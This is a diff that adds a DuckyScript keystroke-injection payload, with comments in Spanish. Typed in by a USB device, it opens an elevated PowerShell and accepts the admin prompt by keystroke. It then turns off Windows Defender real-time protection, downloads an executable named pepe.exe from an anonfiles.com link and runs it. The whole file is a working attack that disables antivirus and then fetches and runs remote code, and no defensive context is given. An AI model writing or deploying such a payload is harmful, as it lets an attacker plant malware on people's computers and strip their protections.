@@ -1,0 +1,28 @@
+DELAY 2000
+GUI r
+DELAY 200
+STRING powershell Start-Process PowerShell -Verb RunAs
+ENTER
+DELAY 5000
+LEFT
+ENTER
+DELAY 2000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 2000
+ALT F4
+DELAY 2000
+GUI r
+DELAY 200
+REM Descargar el archivo del enlace especificado
+STRING powershell -command Invoke-WebRequest https://anonfiles.com/u5kdb3l1ze/pepe.exe -OutFile $env:USERPROFILE\Desktop\pepe.exe
+DELAY 500
+ENTER
+
+REM Esperar a que se descargue el archivo
+DELAY 10000
+
+REM Ejecutar el archivo descargado
+STRING powershell -command Start-Process $env:USERPROFILE\Desktop\pepe.exe
+DELAY 500
+ENTER
